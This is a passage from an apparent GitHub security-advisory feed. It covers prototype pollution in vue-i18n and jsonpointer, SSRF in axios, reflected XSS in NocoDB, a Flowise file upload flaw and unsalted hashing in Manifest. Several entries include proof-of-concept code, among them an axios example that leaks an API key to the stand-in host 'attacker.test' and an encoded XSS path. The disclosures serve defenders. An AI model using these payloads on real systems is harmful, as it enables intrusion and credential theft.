                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[petite-vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/vue-i18n-core] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/message-resolver] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).\nReference: axios/axios#6463</p>\n<p>A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠<code>baseURL</code> is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.</p>\n<h3 id=\"details\">Details</h3>\n<p>Consider the following code snippet:</p>\n<pre><code class=\"language-js\">import axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n</code></pre>\n<p>In this example, the request is sent to <code>http://attacker.test/</code> instead of the <code>baseURL</code>. As a result, the domain owner of <code>attacker.test</code> would receive the <code>X-API-KEY</code> included in the request headers.</p>\n<p>It is recommended that:</p>\n<ul>\n<li>   When <code>baseURL</code> is set, passing an absolute URL such as <code>http://attacker.test/</code> to <code>get()</code> should not ignore <code>baseURL</code>.</li>\n<li>   Before sending the HTTP request (after combining the <code>baseURL</code> with the user-provided parameter), axios should verify that the resulting URL still begins with the expected <code>baseURL</code>.</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<p>Follow the steps below to reproduce the issue:</p>\n<ol>\n<li>   Set up two simple HTTP servers:</li>\n</ol>\n<pre><code>mkdir /tmp/server1 /tmp/server2\necho \"this is server1\" &gt; /tmp/server1/index.html \necho \"this is server2\" &gt; /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &amp;\npython -m http.server -d /tmp/server2 10002 &amp;\n</code></pre>\n<ol start=\"2\">\n<li>   Create a script (e.g., main.js):</li>\n</ol>\n<pre><code class=\"language-js\">import axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n</code></pre>\n<ol start=\"3\">\n<li>   Run the script:</li>\n</ol>\n<pre><code>$ node main.js\nthis is server2\n</code></pre>\n<p>Even though <code>baseURL</code> is set to <code>http://localhost:10001/</code>, axios sends the request to <code>http://localhost:10002/</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>   Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.</li>\n<li>   SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.</li>\n<li>   Affected Users: Software that uses <code>baseURL</code> and does not validate path parameters is affected by this issue.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6\">https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6</a></li>\n<li><a href=\"https://github.com/axios/axios/issues/6463\">https://github.com/axios/axios/issues/6463</a></li>\n<li><a href=\"https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f\">https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f</a></li>\n<li><a href=\"https://github.com/axios/axios/releases/tag/v1.8.2\">https://github.com/axios/axios/releases/tag/v1.8.2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27152\">https://nvd.nist.gov/vuln/detail/CVE-2025-27152</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr5f-v2jv-69x6\">https://github.com/advisories/GHSA-jr5f-v2jv-69x6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6",
            "title": "[axios] axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
            "date_modified": "2025-03-07T19:16:41.000Z",
            "date_published": "2025-03-07T15:16:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The API endpoint related to the password reset function is vulnerable to Reflected Cross-Site-Scripting. </p>\n<h3 id=\"details\">Details</h3>\n<p>Throughout the source-code analysis, it has been found that the endpoint /api/v1/db/auth/password/reset/:tokenId is vulnerable to Reflected Cross-Site-Scripting.</p>\n<p>The flaw occurs due to implementation of the client-side template engine ejs, specifically on file resetPassword.ts where the template is using the insecure function “&lt;%-“ \n<a href=\"https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/ui/auth/resetPassword.ts#L71\">https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/ui/auth/resetPassword.ts#L71</a><br>which is rendered by the function renderPasswordReset: \n<a href=\"https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/auth.controller.ts#L251\">https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/auth.controller.ts#L251</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Send the request below to a vulnerable instance: \n<code>/api/v1/db/auth/password/reset/asdsad%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E/</code></p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/28d8e7c6-efb9-49df-b049-56dab229d74f\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability affect end-users, allowing an attacker to craft and send a malicious link to the victim which leads running script on their browser.</p>\n<h3 id=\"credits\">Credits</h3>\n<p><a href=\"https://github.com/xL34K3D\">l34k3d</a>\n<a href=\"https://github.com/gabrielott\">ottoboni</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nocodb/nocodb/security/advisories/GHSA-wf6c-hrhf-86cw\">https://github.com/nocodb/nocodb/security/advisories/GHSA-wf6c-hrhf-86cw</a></li>\n<li><a href=\"https://github.com/nocodb/nocodb/commit/ea821edb133e621e26183ae65c8ff9ee5d6f2723\">https://github.com/nocodb/nocodb/commit/ea821edb133e621e26183ae65c8ff9ee5d6f2723</a></li>\n<li><a href=\"https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/auth.controller.ts#L251\">https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/auth.controller.ts#L251</a></li>\n<li><a href=\"https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/ui/auth/resetPassword.ts#L71\">https://github.com/nocodb/nocodb/blob/ba5a191b33259d984fc92df225f7d82ede2ddb56/packages/nocodb/src/modules/auth/ui/auth/resetPassword.ts#L71</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27506\">https://nvd.nist.gov/vuln/detail/CVE-2025-27506</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wf6c-hrhf-86cw\">https://github.com/advisories/GHSA-wf6c-hrhf-86cw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wf6c-hrhf-86cw",
            "title": "[nocodb] NocoDB Vulnerable to Reflected Cross-Site Scripting on Reset Password Page",
            "date_modified": "2025-03-06T21:36:44.000Z",
            "date_published": "2025-03-06T18:52:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wf6c-hrhf-86cw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>This affects the package <code>jsonpointer</code> before <code>5.0.0</code>. A type confusion vulnerability can lead to a bypass of a previous Prototype Pollution fix when the pointer components are arrays.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-23807\">https://nvd.nist.gov/vuln/detail/CVE-2021-23807</a></li>\n<li><a href=\"https://github.com/janl/node-jsonpointer/pull/51\">https://github.com/janl/node-jsonpointer/pull/51</a></li>\n<li><a href=\"https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4\">https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288\">https://snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1910273\">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1910273</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-282f-qqgm-c34q\">https://github.com/advisories/GHSA-282f-qqgm-c34q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-282f-qqgm-c34q",
            "title": "[org.webjars.npm:json-pointer] Prototype Pollution in node-jsonpointer",
            "date_modified": "2025-03-05T19:06:11.000Z",
            "date_published": "2021-11-08T17:44:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-282f-qqgm-c34q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>FlowiseAI Flowise v2.2.6 was discovered to contain an arbitrary file upload vulnerability in /api/v1/attachments.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26319\">https://nvd.nist.gov/vuln/detail/CVE-2025-26319</a></li>\n<li><a href=\"https://github.com/dorattias/CVE-2025-26319\">https://github.com/dorattias/CVE-2025-26319</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/blob/flowise-ui%402.2.6/packages/server/src/index.ts#L165-L190\">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%402.2.6/packages/server/src/index.ts#L165-L190</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-69jq-qr7w-j7qh\">https://github.com/advisories/GHSA-69jq-qr7w-j7qh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-69jq-qr7w-j7qh",
            "title": "[flowise] FlowiseAI Flowise arbitrary file upload vulnerability",
            "date_modified": "2025-03-05T18:37:35.000Z",
            "date_published": "2025-03-05T00:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-69jq-qr7w-j7qh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Manifest employs a weak password hashing implementation that uses SHA3 without a salt. This exposes user passwords to a higher risk of being cracked if an attacker gains access to the database. Without the use of a salt, identical passwords across multiple users will result in the same hash, making it easier for attackers to identify and exploit patterns, thereby accelerating the cracking process.</p>\n<h3 id=\"details\">Details</h3>\n<p>Analysis of the application source code reveals that user passwords are hashed using the SHA3 algorithm without implementing a unique salt per user.</p>\n<pre><code>const newUser: AuthenticableEntity = entityRepository.create(signupUserDto)\nnewUser.password = SHA3(newUser.password).toString()\n</code></pre>\n<p>This approach results in deterministic password hashes, which can be identified by comparing the hashes for users with matching credentials.</p>\n<p><img alt=\"password without salt\" src=\"https://github.com/user-attachments/assets/8ce816ab-0351-44d4-9aa3-717266441d6e\"></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create two users with the same password (it could be admin or any other authenticatable entity)</li>\n<li>Extract their password hashes from the database</li>\n<li>Verify that both hashes are identical, confirming the absence of unique salts</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a cryptographic weakness vulnerability that affects all users of the system. The lack of a unique salt when hashing passwords reduces protection against database breaches, as attackers who gain access to the database can more efficiently crack user passwords. Since identical passwords result in identical hashes, attackers can use precomputed hash databases (e.g., Rainbow Tables) or offline brute-force attacks to reverse the hashes and obtain user passwords, increasing the risk of compromised accounts and further system exploitation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mnfst/manifest/security/advisories/GHSA-h8h6-7752-g28c\">https://github.com/mnfst/manifest/security/advisories/GHSA-h8h6-7752-g28c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27408\">https://nvd.nist.gov/vuln/detail/CVE-2025-27408</a></li>\n<li><a href=\"https://github.com/mnfst/manifest/commit/3ed6f1324e96ad469ad929d470dcd0cc386c6c69\">https://github.com/mnfst/manifest/commit/3ed6f1324e96ad469ad929d470dcd0cc386c6c69</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h8h6-7752-g28c\">https://github.com/advisories/GHSA-h8h6-7752-g28c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h8h6-7752-g28c",
            "title": "[manifest] Manifest Uses a One-Way Hash without a Salt",
            "date_modified": "2025-03-04T22:23:27.000Z",
            "date_published": "2025-03-03T19:55:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h8h6-7752-g28c"
            },
            "tags": [
                "severity"
            ]
        },
        {
